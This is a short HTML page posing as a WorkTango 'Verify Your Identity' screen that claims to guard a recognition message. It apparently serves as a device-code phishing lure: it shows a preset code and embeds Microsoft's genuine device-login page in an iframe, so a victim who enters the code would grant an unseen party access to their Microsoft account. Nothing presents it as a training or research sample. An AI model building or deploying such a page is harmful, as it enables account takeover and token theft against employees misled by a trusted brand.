<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WorkTango - Verify Your Identity</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; }
        .header { background: white; padding: 16px 24px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 12px; }
        .logo { font-size: 20px; font-weight: 700; color: #6c63ff; }
        .header-text { color: #666; font-size: 14px; }
        .code-banner { background: #f0f0ff; border-bottom: 2px solid #6c63ff; padding: 12px 24px; display: flex; align-items: center; justify-content: center; gap: 16px; }
        .code-label { color: #555; font-size: 14px; }
        .code { font-size: 22px; font-weight: 700; letter-spacing: 3px; color: #6c63ff; font-family: monospace; }
        iframe { width: 100%; height: calc(100vh - 110px); border: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">WorkTango</div>
        <div class="header-text">&#x1F510; Identity verification required to view your recognition</div>
    </div>
    <div class="code-banner">
        <span class="code-label">Enter this code when prompted:</span>
        <span class="code">N42D9YSNX</span>
    </div>
    <iframe src="https://login.microsoftonline.com/common/oauth2/deviceauth"></iframe>
</body>
</html>
